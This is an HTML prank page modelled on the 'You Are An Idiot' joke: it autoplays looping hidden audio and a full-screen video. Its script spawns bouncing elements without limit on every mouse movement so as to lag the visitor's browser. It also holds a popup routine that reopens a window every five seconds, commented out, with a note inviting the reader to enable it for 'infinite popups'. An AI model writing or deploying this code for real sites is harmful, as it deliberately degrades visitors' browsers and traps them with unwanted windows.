<html>
<head>
    <title>You Are An Idiot!</title>
    <link rel="stylesheet" href="styles/styles.css">
    <script src="scripts/you.js"></script>

    <style>
        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            background: black;
        }

        .idiot-container {
            width: 100%;
            height: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .laggy-ball {
            position: absolute;
            width: 15px;
            height: 15px;
            border-radius: 50%;
            background: lime;
        }
    </style>
</head>

<body>
    <div class="idiot-container">            
        <video src="media/youare.mp4" type="video/mp4" id="youare-video" muted autoplay loop></video>
    </div>    

    <audio id="youare-audio" autoplay loop hidden>
        <source src="media/youare.mp3" type="audio/mp3">
    </audio>

    <script>
        // ================= Laggy DOM Elements =================
        const balls = [];

        // Spawn initial 100 laggy balls
        for (let i = 0; i < 100; i++) {
            const ball = document.createElement('div');
            ball.className = 'laggy-ball';
            ball.style.left = Math.random() * window.innerWidth + 'px';
            ball.style.top = Math.random() * window.innerHeight + 'px';
            document.body.appendChild(ball);
            ball.vx = (Math.random() - 0.5) * 10;
            ball.vy = (Math.random() - 0.5) * 10;
            balls.push(ball);
        }

        function moveBalls() {
            for (let ball of balls) {
                let x = parseFloat(ball.style.left);
                let y = parseFloat(ball.style.top);
                x += ball.vx;
                y += ball.vy;
                if (x < 0 || x > window.innerWidth-15) ball.vx *= -1;
                if (y < 0 || y > window.innerHeight-15) ball.vy *= -1;
                ball.style.left = x + 'px';
                ball.style.top = y + 'px';
            }
            requestAnimationFrame(moveBalls);
        }

        moveBalls();

        // ================= Mouse Chaos =================
        document.addEventListener('mousemove', e => {
            for (let i = 0; i < 5; i++) {
                const ball = document.createElement('div');
                ball.className = 'laggy-ball';
                ball.style.left = e.clientX + 'px';
                ball.style.top = e.clientY + 'px';
                ball.vx = (Math.random() - 0.5) * 15;
                ball.vy = (Math.random() - 0.5) * 15;
                document.body.appendChild(ball);
                balls.push(ball);
            }
        });

        // ================= Popup Chaos =================
        function spawnPopup() {
            const win = window.open('lol.html', '_blank', 'width=357,height=330,menubar=no,toolbar=no,resizable=no');
            setTimeout(spawnPopup, 5000); // spawn every 5 seconds
        }
        // Uncomment next line for **ultra chaos** (infinite popups)
        // spawnPopup();
    </script>
</body>
</html>
